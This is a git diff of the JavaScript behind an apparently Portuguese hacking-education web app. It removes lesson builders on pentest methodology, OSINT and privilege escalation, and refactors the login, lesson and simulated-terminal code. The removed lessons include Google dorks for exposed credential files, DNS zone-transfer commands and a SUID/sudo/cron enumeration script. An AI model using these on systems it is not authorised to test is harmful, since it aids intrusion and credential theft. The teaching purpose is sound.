-<span class="ck">echo</span> <span class="cf">""</span> | <span class="ck">nc</span> <span class="cf">-w 3</span> <span class="cv">scanme.nmap.org</span> <span class="cf">22</span>
-<span class="ck">curl</span> <span class="cf">-I</span> <span class="cv">http://scanme.nmap.org</span>
-<span class="ck">nmap</span> <span class="cf">--script=banner</span> <span class="cv">scanme.nmap.org</span>`)
-}
-
-function buildLesson10(){
-return`<div class="lesson-eyebrow">Módulo 3 · Pentesting</div>
-<h1 class="lesson-h1">Metodologia de Pentest e OSINT</h1>
-<div class="lesson-desc">Antes de tocar num único pacote, um pentester passa horas em reconhecimento passivo. OSINT pode revelar mais do que qualquer scanner.</div>`+
-
-sec(1,"Fases do Pentest",
-tbl(["Fase","Ferramentas","Output"],
-[["1. Recon Passivo","Whois, Google, crt.sh","IPs, subdomínios, emails"],
-["2. Scanning","Nmap, Nikto","Portas, versões, vulns"],
-["3. Exploração","Metasploit, scripts","Acesso inicial"],
-["4. Pós-exploração","LinPEAS, scripts","Root, hashes, dados"],
-["5. Relatório","Markdown, Word","Documento profissional"]])+
-tip("📋","Regras de Engagement","Sempre ter contrato assinado, escopo definido, IPs autorizados, janela de tempo e ponto de contacto.")
-)+
-
-sec(2,"Google Dorks — OSINT com motores de pesquisa",
-cb("dorks",`<span class="co">site:empresa.pt                → só páginas do domínio</span>
-<span class="co">site:empresa.pt filetype:pdf   → PDFs do domínio</span>
-<span class="co">intitle:"login" site:empresa   → páginas de login</span>
-<span class="co">inurl:".php?id="               → potencial SQLi</span>
-<span class="co">filetype:env DB_PASSWORD       → ficheiros .env expostos!</span>
-<span class="co">site:pastebin.com "empresa"    → dados vazados</span>`,false)+
-hack("Google dorks encontram ficheiros .env com credenciais de produção regularmente em bug bounty.")
-)+
-
-sec(3,"WHOIS e DNS recon",
-cb("bash",`<span class="ck">pkg install</span> <span class="cv">whois</span>
-<span class="ck">whois</span> <span class="cv">empresa.pt</span>           <span class="cm"># dono, datas, nameservers</span>
-<span class="ck">dig</span> <span class="cv">empresa.pt ANY</span>         <span class="cm"># todos os registos DNS</span>
-<span class="ck">dig axfr</span> <span class="cf">@ns1.empresa.pt</span> <span class="cv">empresa.pt</span>  <span class="cm"># zone transfer</span>
-<span class="cm"># crt.sh para subdomínios via certificados SSL:</span>
-<span class="ck">curl</span> <span class="cs">"https://crt.sh/?q=%.empresa.pt&output=json"</span> | <span class="ck">python3 -m json.tool</span>`)
-)+
-
-ex(`<span class="ck">pkg install</span> <span class="cv">whois</span>
-<span class="ck">whois</span> <span class="cv">nmap.org</span>
-<span class="ck">dig</span> <span class="cv">nmap.org ANY</span>
-<span class="ck">curl</span> <span class="cs">"https://crt.sh/?q=%.nmap.org&output=json"</span> <span class="cs">2>/dev/null</span> | <span class="ck">python3 -m json.tool</span> | <span class="ck">grep</span> <span class="cs">name_value</span> | <span class="ck">sort -u</span> | <span class="ck">head</span> <span class="cf">-20</span>`)
-}
-
-function buildLesson11(){
-return`<div class="lesson-eyebrow">Módulo 4 · Scripts</div>
-<h1 class="lesson-h1">Enumeração e privilege escalation</h1>
-<div class="lesson-desc">Após obter acesso inicial, a enumeração local é o próximo passo — perceber onde estás, quem és, o que podes fazer e como escalar privilégios.</div>`+
-
-sec(1,"Script de enumeração completo",
-cb("bash",`<span class="ck">#!/bin/bash</span>
-<span class="ck">echo</span> <span class="cs">"═══ SYSTEM ═══"</span>; <span class="ck">uname</span> <span class="cf">-a</span>
-<span class="ck">echo</span> <span class="cs">"═══ USER ═══"</span>; <span class="ck">id</span>; <span class="ck">sudo</span> <span class="cf">-l</span> <span class="cs">2>/dev/null</span>
-<span class="ck">echo</span> <span class="cs">"═══ USERS WITH SHELL ═══"</span>
-<span class="ck">grep</span> <span class="cf">-v</span> <span class="cs">"nologin\|false"</span> /etc/passwd | <span class="ck">cut</span> <span class="cf">-d: -f1</span>
-<span class="ck">echo</span> <span class="cs">"═══ SUID BINARIES ═══"</span>
-<span class="ck">find</span> / <span class="cf">-perm -4000 -type f</span> <span class="cs">2>/dev/null</span>
-<span class="ck">echo</span> <span class="cs">"═══ CRON JOBS ═══"</span>
-<span class="ck">cat</span> /etc/crontab <span class="cs">2>/dev/null</span>
-<span class="ck">echo</span> <span class="cs">"═══ NETWORK ═══"</span>
-<span class="ck">ss</span> <span class="cf">-tlnp</span>`)+
-hack("LinPEAS (github.com/carlospolop/PEASS-ng) é a versão profissional deste script com 500+ verificações.")
-)+
-
-sec(2,"Vectores de escalação",
-tbl(["Vector","Como explorar"],
-[["SUID binários","<code>find / -perm -4000</code> → verificar GTFOBins"],
-["sudo mal configurado","<code>sudo -l</code> → NOPASSWD em editor = shell root"],
-["Cron jobs","Scripts writable em cron = command injection"],
-["PATH hijacking","Script usa comando sem caminho absoluto"],
-["Capabilities","<code>getcap -r / 2>/dev/null</code>"]])+
-ex(`<span class="ck">id</span>
-<span class="ck">sudo</span> <span class="cf">-l</span> <span class="cs">2>/dev/null</span>
-<span class="ck">find</span> / <span class="cf">-perm -4000 -user root -type f</span> <span class="cs">2>/dev/null</span>
-<span class="ck">cat</span> /etc/crontab <span class="cs">2>/dev/null</span>
-<span class="ck">find</span> / <span class="cf">-writable -type d</span> <span class="cs">2>/dev/null</span> | <span class="ck">grep</span> <span class="cf">-v</span> <span class="cs">"/proc"</span>`)
-)
-}
-
-function buildLesson12(){
-return`<div class="lesson-eyebrow">Módulo 5 · CTF</div>
-<h1 class="lesson-h1">CTF — Capture The Flag</h1>
-<div class="lesson-desc">CTF são competições onde resolves desafios de segurança para obter "flags". São a melhor forma de praticar hacking ético legalmente.</div>`+
-
-sec(1,"O que é um CTF?",
-cb("ctf",`<span class="co">Formato típico de flag: HTB{s0me_r4nd0m_str1ng}</span>
-<span class="co">Categorias:</span>
-<span class="co">  Web          → SQLi, XSS, IDOR, File Upload</span>
-<span class="co">  Pwn          → Buffer overflow, ROP chains</span>
-<span class="co">  Crypto       → Quebrar cifras</span>
-<span class="co">  Forensics    → Analisar ficheiros, pcaps</span>
-<span class="co">  Reversing    → Engenharia reversa de binários</span>
-<span class="co">  Misc         → Steganography, OSINT</span>`,false)
-)+
-
-sec(2,"Plataformas recomendadas",
-tbl(["Plataforma","URL","Tipo"],
-[["HackTheBox","hackthebox.com","Máquinas Linux/Windows"],
-["TryHackMe","tryhackme.com","Guiado para iniciantes"],
-["PicoCTF","picoctf.org","Iniciante, gratuito"],
-["CTFtime","ctftime.org","Calendário de competições"]])+
-tip("🏁","Começa aqui","TryHackMe tem paths guiados para iniciantes. HackTheBox é para quando já tens os fundamentos.")
-)+
-
-sec(3,"Metodologia para máquinas Linux",
-cb("bash",`<span class="cm"># 1. Recon</span>
-<span class="ck">nmap</span> <span class="cf">-sV -sC -p-</span> <span class="cv">TARGET_IP</span>
-
-<span class="cm"># 2. Enumerar serviços encontrados</span>
-<span class="cm"># Web (80/443) → gobuster, nikto, burpsuite</span>
-<span class="cm"># SSH (22) → tentar credenciais, ver versão</span>
-<span class="cm"># SMB (445) → enum4linux, smbclient</span>
-
-<span class="cm"># 3. Após acesso inicial</span>
-<span class="ck">id</span>; <span class="ck">sudo</span> <span class="cf">-l</span>; <span class="ck">find</span> / <span class="cf">-perm -4000</span> <span class="cs">2>/dev/null</span>
-
-<span class="cm"># 4. User flag</span>
-<span class="ck">cat</span> <span class="cs">~/user.txt</span>
-
-<span class="cm"># 5. Root flag</span>
-<span class="ck">cat</span> /root/root.txt`)
-)+
-
-ex(`<span class="cm"># Cria conta no TryHackMe e completa:</span>
-<span class="cm"># 1. "Pre-Security" path (gratuito)</span>
-<span class="cm"># 2. "Linux Fundamentals" rooms</span>
-<span class="cm"># 3. "Networking" room</span>
-<span class="cm"># 4. Primeira máquina: "Basic Pentesting"</span>`)
-}
-
-// ═══════════════════════════════════════
-// TERMINAL SIMULATOR
-// ═══════════════════════════════════════
-const TERM_RESPONSES = {
-  'pwd': '/home/dawn/lab',
-  'ls': 'aula1  aula2  aula3  scripts  tools',
-  'ls -la': `total 36\ndrwxr-xr-x 6 dawn dawn 4096 Apr 28 20:00 .\ndrwxr-xr-x 8 dawn dawn 4096 Apr 28 19:00 ..\ndrwxr-xr-x 2 dawn dawn 4096 Apr 28 20:00 aula1\ndrwxr-xr-x 2 dawn dawn 4096 Apr 28 20:00 aula2\ndrwxr-xr-x 2 dawn dawn 4096 Apr 28 20:00 scripts`,
-  'ls -la /etc/passwd': `-rw-r--r-- 1 root root 2847 Jan  1 00:00 /etc/passwd`,
-  'ls -la /tmp': `drwxrwxrwt 8 root root 4096 Apr 28 /tmp`,
-  'whoami': 'dawn',
-  'id': 'uid=1000(dawn) gid=1000(dawn) groups=1000(dawn),27(sudo)',
-  'ps aux | wc -l': '42',
-  'cat /etc/passwd | cut -d: -f1': 'root\ndaemon\nbin\nsys\ndawn\nnobody',
-  'ps aux | grep dawn': 'dawn      1234  0.1  0.5  5012 2048 pts/0   S  20:00   0:00 bash',
-  'cd ~': '',
-  'cd /': '',
-  'cd ..': '',
-  'history': `  1  pwd\n  2  ls -la\n  3  cd /etc\n  4  cat passwd\n  5  cd ~`,
-  'echo $SHELL': '/data/data/com.termux/files/usr/bin/bash',
-  'echo $HOME': '/data/data/com.termux/files/home',
-  'clear': '__clear__',
-  'date': new Date().toString(),
-  'uname -a': 'Linux termuxlab 5.15.0-aarch64 #1 SMP PREEMPT Android GNU/Linux',
-};
-
-function runCmd(label) {
-  const input = document.getElementById(`ti-${label}`);
-  const output = document.getElementById(`to-${label}`);
-  const cmd = input.value.trim();
-  if (!cmd) return;
-
-  const line = document.createElement('div');
-  line.innerHTML = `<span class="t-prompt">~/lab $ </span><span style="color:#e2e8f0">${escHtml(cmd)}</span>`;
-  if (output.textContent.includes('Escreve um comando')) output.innerHTML = '';
-  output.appendChild(line);
-
-  const resp = document.createElement('div');
-  const result = TERM_RESPONSES[cmd];
-  if (result === '__clear__') { output.innerHTML = ''; input.value = ''; return; }
-  else if (result !== undefined) {
-    resp.innerHTML = `<span class="t-out">${escHtml(result)}</span>`;
-  } else if (cmd.startsWith('mkdir') || cmd.startsWith('touch') || cmd.startsWith('chmod') || cmd.startsWith('export') || cmd.startsWith('source')) {
-    resp.innerHTML = `<span class="t-out"></span>`;
-  } else if (cmd.startsWith('echo')) {
-    const m = cmd.match(/echo\s+"?([^"]*)"?/);
-    resp.innerHTML = `<span class="t-out">${escHtml(m ? m[1].replace(/\$SHELL/,'/bin/bash').replace(/\$HOME/,'~/').replace(/\$USER/,'dawn') : '')}</span>`;
-  } else {
-    resp.innerHTML = `<span class="t-err">bash: ${escHtml(cmd.split(' ')[0])}: command not found (simulação)</span>`;
-  }
-  output.appendChild(resp);
-  output.scrollTop = output.scrollHeight;
-  input.value = '';
-}
-
-function escHtml(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;') }
-
-// ═══════════════════════════════════════
-// PAGE NAVIGATION
-// ═══════════════════════════════════════
-const PAGES = ['home','login','register','lessons','lesson','profile'];
-
-function showPage(id) {
-  PAGES.forEach(p => {
-    const el = document.getElementById(`page-${p}`);
-    if (el) el.classList.toggle('active', p === id);
-  });
-  window.scrollTo(0, 0);
-
-  const bnav = document.getElementById('bottom-nav');
-  const isLoggedIn = !!currentUser;
-  bnav.style.display = (isLoggedIn && ['lessons','lesson','profile'].includes(id)) ? 'flex' : 'none';
-
-  ['bn-lessons','bn-profile'].forEach(id2 => document.getElementById(id2)?.classList.remove('active'));
-  if (id === 'lessons' || id === 'lesson') document.getElementById('bn-lessons')?.classList.add('active');
-  if (id === 'profile') document.getElementById('bn-profile')?.classList.add('active');
-
-  if (id === 'lessons') loadLessons();
-  if (id === 'profile') loadProfile();
-}
-
-function goHome() {
-  if (currentUser) showPage('lessons');
-  else showPage('home');
-}
-
-// ═══════════════════════════════════════
-// AUTH
-// ═══════════════════════════════════════
-async function doLogin() {
-  const email = document.getElementById('login-email').value;
-  const password = document.getElementById('login-password').value;
-  const err = document.getElementById('login-error');
+// ═══════════════ AUTH ═══════════════
+function doLogin() {
+  var email = document.getElementById('li-email').value.trim();
+  var pass = document.getElementById('li-pass').value;
+  var err = document.getElementById('login-err');
   err.classList.remove('show');
-  try {
-    const r = await fetch('/api/auth/login', {
-      method:'POST', headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({email, password})
-    });
-    const data = await r.json();
-    if (!r.ok) { err.textContent = data.error; err.classList.add('show'); return; }
-    setUser(data.token, data.user);
-    showPage('lessons');
-    toast('Bem-vindo de volta, ' + data.user.username + '! 👋', 'success');
-  } catch(e) { err.textContent = 'Erro de ligação'; err.classList.add('show'); }
+  if (!email || !pass) { showErr(err, 'Preenche todos os campos'); return; }
+  fetch('/api/auth/login', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({email: email, password: pass})
+  }).then(function(r){ return r.json().then(function(d){ return {ok:r.ok,d:d} }) })
+  .then(function(x){
+    if (!x.ok) { showErr(err, x.d.error || 'Erro'); return; }
+    setUser(x.d.token, x.d.user);
+    go('lessons');
+    toast('Bem-vindo de volta, ' + x.d.user.username + '!', 'ok');
+  }).catch(function(){ showErr(err, 'Erro de ligação. Tenta novamente.') });
 }
 
-async function doRegister() {
-  const username = document.getElementById('reg-username').value;
-  const email = document.getElementById('reg-email').value;
-  const password = document.getElementById('reg-password').value;
-  const password2 = document.getElementById('reg-password2').value;
-  const err = document.getElementById('reg-error');
+function doRegister() {
+  var user = document.getElementById('re-user').value.trim();
+  var email = document.getElementById('re-email').value.trim();
+  var pass = document.getElementById('re-pass').value;
+  var pass2 = document.getElementById('re-pass2').value;
+  var err = document.getElementById('reg-err');
   err.classList.remove('show');
-  if (password !== password2) { err.textContent = 'Passwords não coincidem'; err.classList.add('show'); return; }
-  try {
-    const r = await fetch('/api/auth/register', {
-      method:'POST', headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({username, email, password})
-    });
-    const data = await r.json();
-    if (!r.ok) { err.textContent = data.error; err.classList.add('show'); return; }
-    setUser(data.token, data.user);
-    showPage('lessons');
-    toast('Conta criada! Bem-vindo ao TermuxLab 🚀', 'success');
-  } catch(e) { err.textContent = 'Erro de ligação'; err.classList.add('show'); }
+  if (!user || !email || !pass) { showErr(err, 'Preenche todos os campos'); return; }
+  if (pass !== pass2) { showErr(err, 'As passwords não coincidem'); return; }
+  if (pass.length < 6) { showErr(err, 'Password deve ter pelo menos 6 caracteres'); return; }
+  fetch('/api/auth/register', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({username: user, email: email, password: pass})
+  }).then(function(r){ return r.json().then(function(d){ return {ok:r.ok,d:d} }) })
+  .then(function(x){
+    if (!x.ok) { showErr(err, x.d.error || 'Erro'); return; }
+    setUser(x.d.token, x.d.user);
+    go('lessons');
+    toast('Conta criada! Bem-vindo ao TermuxLab 🚀', 'ok');
+  }).catch(function(){ showErr(err, 'Erro de ligação. Tenta novamente.') });
 }
 
 function setUser(token, user) {
-  currentUser = user;
+  USER = user;
   localStorage.setItem('tl_token', token);
   localStorage.setItem('tl_user', JSON.stringify(user));
-  const nu = document.getElementById('nav-username');
-  if (nu) nu.textContent = user.username;
+  document.getElementById('nav-user').textContent = user.username;
+  document.getElementById('p-name').textContent = user.username;
+  document.getElementById('p-email').textContent = user.email;
 }
 
 function doLogout() {
-  currentUser = null;
-  userProgress = [];
+  USER = null; PROGRESS = []; BADGES = [];
   localStorage.removeItem('tl_token');
   localStorage.removeItem('tl_user');
-  showPage('home');
+  go('home');
   toast('Sessão terminada', '');
 }
 
-function getToken() { return localStorage.getItem('tl_token'); }
+function getToken() { return localStorage.getItem('tl_token') || ''; }
+function showErr(el, msg) { el.textContent = msg; el.classList.add('show'); }
 
-// ═══════════════════════════════════════
-// LESSONS
-// ═══════════════════════════════════════
-async function loadLessons() {
-  try {
-    const r = await fetch('/api/progress', { headers:{'Authorization':'Bearer '+getToken()} });
-    userProgress = await r.json();
-  } catch(e) { userProgress = []; }
-
-  const completed = userProgress.filter(p => p.completed).length;
-  const total = LESSONS.length;
-  document.getElementById('progress-text').textContent = `${completed} / ${total} aulas`;
-  document.getElementById('progress-bar').style.width = `${Math.round(completed/total*100)}%`;
-
-  const list = document.getElementById('lessons-list');
-  list.innerHTML = '';
-  let lastModule = '';
-
-  LESSONS.forEach((l, i) => {
-    const done = userProgress.some(p => p.lesson_id === l.id && p.completed);
-    const levelClass = {'beginner':'bl-beginner','intermediate':'bl-intermediate','advanced':'bl-advanced'}[l.level];
-    const levelLabel = {'beginner':'Iniciante','intermediate':'Intermédio','advanced':'Avançado'}[l.level];
-
-    if (l.module !== lastModule) {
-      const mod = document.createElement('div');
-      mod.style.cssText = 'font-size:.72rem;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.1em;padding:12px 0 4px';
-      mod.textContent = l.module;
-      list.appendChild(mod);
-      lastModule = l.module;
-    }
-
-    const card = document.createElement('div');
-    card.className = 'lesson-card';
-    card.innerHTML = `
-      <div class="lesson-num ${done?'ln-done':'ln-active'}">${done?'✓':String(i+1).padStart(2,'0')}</div>
-      <div class="lesson-info">
-        <div class="lesson-title">${l.title}</div>
-        <div class="lesson-meta"><span class="badge-level ${levelClass}">${levelLabel}</span>${l.duration}</div>
-      </div>
-      <div class="lesson-arrow">›</div>`;
-    card.onclick = () => openLesson(l.id);
-    list.appendChild(card);
-  });
-
-  document.getElementById('nav-username').textContent = currentUser?.username || '';
-}
-
-function openLesson(id) {
-  currentLesson = id;
-  const l = LESSONS[id];
-  const done = userProgress.some(p => p.lesson_id === id && p.completed);
-  const progress = Math.round((id+1)/LESSONS.length*100);
-  document.getElementById('lpfill').style.width = progress+'%';
-
-  const navHTML = `
-    <div class="lesson-nav-btns">
-      ${id > 0 ? `<button class="btn btn-outline" onclick="openLesson(${id-1})">← Anterior</button>` : ''}
-      ${!done
-        ? `<button class="btn complete-btn" onclick="completeLesson(${id})">✓ Marcar como concluída</button>`
-        : `<button class="btn complete-btn done" disabled>✓ Concluída</button>`
-      }
-      ${id < LESSONS.length-1 ? `<button class="btn btn-primary" onclick="openLesson(${id+1})">Próxima →</button>` : ''}
-    </div>`;
-
-  document.getElementById('lesson-body').innerHTML = l.content + navHTML;
-  showPage('lesson');
-}
-
-async function completeLesson(id) {
-  try {
-    await fetch('/api/progress/complete', {
-      method:'POST', headers:{'Content-Type':'application/json','Authorization':'Bearer '+getToken()},
-      body: JSON.stringify({lesson_id: id})
-    });
-    const r = await fetch('/api/progress', { headers:{'Authorization':'Bearer '+getToken()} });
-    userProgress = await r.json();
-    toast('Aula concluída! 🎉', 'success');
-    openLesson(id); // refresh
-  } catch(e) { toast('Erro ao guardar progresso', 'error'); }
-}
-
-// ═══════════════════════════════════════
-// PROFILE
-// ═══════════════════════════════════════
-const ALL_BADGES = [
-  {id:'welcome', icon:'👋', name:'Bem-vindo'},
-  {id:'first_lesson', icon:'📚', name:'1ª Aula'},
-  {id:'three_lessons', icon:'🔥', name:'3 Aulas'},
-  {id:'module1_complete', icon:'🏆', name:'Módulo 1'},
-  {id:'ten_lessons', icon:'💎', name:'10 Aulas'},
-  {id:'hacker', icon:'🎯', name:'Hacker'},
+// ═══════════════ LESSONS DATA ═══════════════
+var LESSONS = [
+{id:0,title:'Terminal, Shell e como o Linux pensa',module:'Módulo 1 · Fundamentos',level:'ini',dur:'50 min'},
+{id:1,title:'Criar, mover, copiar e apagar',module:'Módulo 1 · Fundamentos',level:'ini',dur:'55 min'},
+{id:2,title:'Permissões, utilizadores e grupos',module:'Módulo 1 · Fundamentos',level:'ini',dur:'60 min'},
+{id:3,title:'Processos, pipes e redirecionamento',module:'Módulo 1 · Fundamentos',level:'mid',dur:'65 min'},
+{id:4,title:'Variáveis de ambiente e .bashrc',module:'Módulo 1 · Fundamentos',level:'mid',dur:'45 min'},
+{id:5,title:'Bash Scripting — automação e poder',module:'Módulo 1 · Fundamentos',level:'mid',dur:'75 min'},
+{id:6,title:'Modelo OSI, TCP/IP e protocolos',module:'Módulo 2 · Redes',level:'mid',dur:'60 min'},
+{id:7,title:'IP, Subnetting, DNS e HTTP',module:'Módulo 2 · Redes',level:'mid',dur:'55 min'},
+{id:8,title:'Nmap — reconhecimento de redes',module:'Módulo 2 · Redes',level:'adv',dur:'70 min'},
+{id:9,title:'Netcat e reconhecimento de serviços',module:'Módulo 2 · Redes',level:'adv',dur:'50 min'},
+{id:10,title:'Metodologia de Pentest e OSINT',module:'Módulo 3 · Pentesting',level:'adv',dur:'55 min'},
+{id:11,title:'Enumeração e privilege escalation',module:'Módulo 4 · Scripts',level:'adv',dur:'60 min'},
+{id:12,title:'CTF — Capture The Flag',module:'Módulo 5 · CTF',level:'adv',dur:'90 min'}
 ];
 
-async function loadProfile() {
-  if (!currentUser) return;
-  document.getElementById('p-name').textContent = currentUser.username;
-  document.getElementById('p-email').textContent = currentUser.email;
-
-  try {
-    const [statsR, badgesR] = await Promise.all([
-      fetch('/api/stats', { headers:{'Authorization':'Bearer '+getToken()} }),
-      fetch('/api/badges', { headers:{'Authorization':'Bearer '+getToken()} })
-    ]);
-    const stats = await statsR.json();
-    userBadges = await badgesR.json();
-
-    document.getElementById('p-lessons').textContent = stats.completed_lessons;
-    document.getElementById('p-badges').textContent = stats.badges_earned;
-    document.getElementById('p-pct').textContent = Math.round(stats.completed_lessons/LESSONS.length*100)+'%';
-
-    const grid = document.getElementById('badges-grid');
-    grid.innerHTML = ALL_BADGES.map(b => {
-      const earned = userBadges.find(ub => ub.badge_id === b.id);
-      return `<div class="badge-item ${earned?'earned':'locked'}">
-        <div class="badge-icon">${b.icon}</div>
-        <div class="badge-name">${b.name}</div>
-        ${earned ? `<div class="badge-date">${new Date(earned.earned_at).toLocaleDateString('pt')}</div>` : '<div class="badge-date">Bloqueado</div>'}
-      </div>`;
-    }).join('');
-  } catch(e) {}
+// ═══════════════ LOAD LESSONS ═══════════════
+function loadLessons() {
+  fetch('/api/progress', {headers:{'Authorization':'Bearer '+getToken()}})
+  .then(function(r){ return r.json() })
+  .then(function(p){
+    PROGRESS = p;
+    renderLessons();
+  }).catch(function(){ PROGRESS = []; renderLessons(); });
 }
 
-// ═══════════════════════════════════════
-// CODE COPY
-// ═══════════════════════════════════════
-function cpCode(btn) {
-  const code = btn.closest('.code-block').querySelector('.code-body');
-  navigator.clipboard.writeText(code.innerText.trim()).then(() => {
-    btn.textContent = '✓ copiado';
-    btn.style.color = 'var(--green)';
-    setTimeout(() => { btn.textContent = 'copiar'; btn.style.color = ''; }, 2000);
+function renderLessons() {
+  var done = PROGRESS.filter(function(p){ return p.completed }).length;
+  document.getElementById('prog-text').textContent = done + ' / ' + LESSONS.length;
+  document.getElementById('prog-bar').style.width = Math.round(done/LESSONS.length*100) + '%';
+  var list = document.getElementById('lesson-list');
+  list.innerHTML = '';
+  var lastMod = '';
+  LESSONS.forEach(function(l) {
+    var isDone = PROGRESS.some(function(p){ return p.lesson_id === l.id && p.completed });
+    if (l.module !== lastMod) {
+      var mh = document.createElement('div');
+      mh.className = 'mod-header';
+      mh.textContent = l.module;
+      list.appendChild(mh);
+      lastMod = l.module;
+    }
+    var lvlC = {ini:'b-ini',mid:'b-mid',adv:'b-adv'}[l.level];
+    var lvlN = {ini:'Iniciante',mid:'Intermédio',adv:'Avançado'}[l.level];
+    var item = document.createElement('div');
+    item.className = 'lesson-item';
+    item.innerHTML =
+      '<div class="lesson-num '+(isDone?'ln-done':'ln-todo')+'">'+(isDone?'✓':String(l.id+1).padStart(2,'0'))+'</div>'+
+      '<div class="lesson-info">'+
+        '<div class="lesson-name">'+l.title+'</div>'+
+        '<div class="lesson-meta"><span class="badge '+lvlC+'">'+lvlN+'</span>'+l.dur+'</div>'+
+      '</div>'+
+      '<div class="chevron">›</div>';
+    item.onclick = function(){ openLesson(l.id) };
+    list.appendChild(item);
   });
 }
 
-// ═══════════════════════════════════════
-// TOAST
-// ═══════════════════════════════════════
-function toast(msg, type='') {
-  const t = document.getElementById('toast');
-  t.textContent = msg;
-  t.className = `toast ${type} show`;
-  setTimeout(() => t.classList.remove('show'), 3000);
+// ═══════════════ LESSON CONTENT ═══════════════
+function openLesson(id) {
+  CUR_LESSON = id;
+  var prog = Math.round((id+1)/LESSONS.length*100);
+  document.getElementById('lprog').style.width = prog + '%';
+  var isDone = PROGRESS.some(function(p){ return p.lesson_id === id && p.completed });
+  var html = buildLessonHTML(id);
+  var navHTML = '<div class="lesson-nav">';
+  if (id > 0) navHTML += '<button class="btn btn-secondary" onclick="openLesson('+(id-1)+')">← Anterior</button>';
+  if (!isDone) {
+    navHTML += '<button class="btn complete-btn" onclick="completeLesson('+id+')">✓ Concluída</button>';
+  } else {
+    navHTML += '<button class="btn complete-btn done" disabled>✓ Concluída</button>';
+  }
+  if (id < LESSONS.length-1) navHTML += '<button class="btn btn-primary" onclick="openLesson('+(id+1)+')">Próxima →</button>';
+  navHTML += '</div>';
+  document.getElementById('lesson-body').innerHTML = html + navHTML;
+  document.getElementById('lesson-wrap').scrollTop = 0;
+  go('lesson');
 }
 
-// ═══════════════════════════════════════
-// INIT
-// ═══════════════════════════════════════
-(function init() {
-  const token = localStorage.getItem('tl_token');
-  const user = localStorage.getItem('tl_user');
-  if (token && user) {
-    currentUser = JSON.parse(user);
-    showPage('lessons');
+function completeLesson(id) {
+  fetch('/api/progress/complete', {
+    method: 'POST',
+    headers: {'Content-Type':'application/json','Authorization':'Bearer '+getToken()},
+    body: JSON.stringify({lesson_id: id})
+  }).then(function(r){ return r.json() })
+  .then(function(){
+    return fetch('/api/progress', {headers:{'Authorization':'Bearer '+getToken()}}).then(function(r){ return r.json() });
+  }).then(function(p){
+    PROGRESS = p;
+    toast('Aula concluída! 🎉', 'ok');
+    openLesson(id);
+  }).catch(function(){ toast('Erro ao guardar', 'bad') });
+}
+
+// ═══════════════ TERMINAL SIMULATOR ═══════════════
+var TERM_DB = {
+  'pwd': '/home/dawn/lab',
+  'ls': 'aula1  aula2  scripts  tools',
+  'ls -la': 'total 28\ndrwxr-xr-x 5 dawn dawn 4096 Apr 28 .\ndrwxr-xr-x 8 dawn dawn 4096 Apr 28 ..\ndrwxr-xr-x 2 dawn dawn 4096 Apr 28 aula1\ndrwxr-xr-x 2 dawn dawn 4096 Apr 28 aula2\ndrwxr-xr-x 2 dawn dawn 4096 Apr 28 scripts',
+  'ls -la /etc/passwd': '-rw-r--r-- 1 root root 2847 Jan 1 /etc/passwd',
+  'whoami': 'dawn',
+  'id': 'uid=1000(dawn) gid=1000(dawn) groups=1000(dawn),27(sudo)',
+  'ps aux | wc -l': '38',
+  'cat /etc/passwd | cut -d: -f1': 'root\ndaemon\nbin\nsys\ndawn\nnobody',
+  'echo $SHELL': '/data/data/com.termux/files/usr/bin/bash',
+  'echo $HOME': '/data/data/com.termux/files/home',
+  'echo $PATH': '/data/data/com.termux/files/usr/bin:/data/data/com.termux/files/usr/sbin',
+  'echo $USER': 'dawn',
+  'history': '  1  pwd\n  2  ls -la\n  3  cd /etc\n  4  cat passwd\n  5  cd ~',
+  'uname -a': 'Linux termuxlab 5.15.0 #1 SMP Android GNU/Linux',
+  'date': new Date().toString(),
+  'ip addr show': '1: lo: <LOOPBACK> mtu 65536\n    inet 127.0.0.1/8\n2: wlan0: <BROADCAST> mtu 1500\n    inet 192.168.1.100/24',
+  'ss -tlnp': 'State  Recv-Q  Send-Q  Local Address:Port\nLISTEN 0       128     0.0.0.0:22\nLISTEN 0       128     0.0.0.0:80',
+  'ps aux | grep dawn': 'dawn  1234  0.1  0.5  bash -i',
+  'cat /etc/passwd | awk -F: \'{print $1,$7}\'': 'root /bin/bash\ndawn /bin/bash\nnobody /sbin/nologin',
+  'clear': '__clear__'
+};
+
+function runTerm(termId) {
+  var inp = document.getElementById('ti-'+termId);
+  var out = document.getElementById('to-'+termId);
+  var cmd = inp.value.trim();
+  if (!cmd) return;
+  if (out.textContent.indexOf('Escreve') >= 0 || out.textContent.indexOf('comando') >= 0) out.innerHTML = '';
+  var line = document.createElement('div');
+  line.innerHTML = '<span class="t-prompt">~/lab $ </span><span style="color:#e2e8f0">'+esc(cmd)+'</span>';
+  out.appendChild(line);
+  var resp = document.createElement('div');
+  var result = TERM_DB[cmd];
+  if (result === '__clear__') { out.innerHTML = ''; inp.value = ''; return; }
+  else if (result !== undefined) {
+    resp.innerHTML = '<span class="t-out">'+esc(result)+'</span>';
+  } else if (/^(mkdir|touch|chmod|export|source|cd |cd$|echo |alias)/.test(cmd)) {
+    resp.innerHTML = '<span class="t-out">[comando executado]</span>';
+  } else if (/^echo /.test(cmd)) {
+    var m = cmd.replace(/^echo /, '').replace(/['"]/g,'').replace(/\$SHELL/,'/bin/bash').replace(/\$HOME/,'~/').replace(/\$USER/,'dawn');
+    resp.innerHTML = '<span class="t-out">'+esc(m)+'</span>';
   } else {
-    showPage('home');
+    resp.innerHTML = '<span class="t-err">bash: '+esc(cmd.split(' ')[0])+': command not found (simulação)</span>';
+  }
+  out.appendChild(resp);
+  out.scrollTop = out.scrollHeight;
+  inp.value = '';
+}
+
+function esc(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\n/g,'<br>');
+}
+
+// ═══════════════ LESSON HTML BUILDERS ═══════════════
+function cb(lang,code,copyable) {
+  var btn = copyable !== false ? '<button class="cb-copy" onclick="cpCode(this)">copiar</button>' : '';
+  return '<div class="cb"><div class="cb-top"><span class="cb-lang">'+lang+'</span>'+btn+'</div><div class="cb-body">'+code+'</div></div>';
+}
+function sec(n,t,body) {
